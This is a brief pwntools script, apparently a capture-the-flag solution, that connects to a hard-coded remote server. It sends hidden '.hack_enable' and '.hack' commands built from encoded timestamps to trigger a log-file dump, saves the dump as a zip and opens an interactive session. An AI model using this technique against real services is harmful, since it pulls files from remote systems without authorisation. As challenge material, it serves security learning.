#!/usr/bin/python

from pwn import *
import zlib
import time

c = remote('45.55.152.134', 7676)

payload = ''
payload += '.hack_enable ' + str(int(time.time())).encode('base64')

c.sendline(payload)

payload = ''
payload += '.hack '
payload += zlib.compress(str(int(time.time()))).encode('base64').strip()

c.sendline(payload)

c.recvuntil('========================= BEGIN LOG FILE DUMP =========================')
data = c.recvuntil('===========')

out = open('file.zip', 'wb')
out.write(data[1:])

c.interactive()
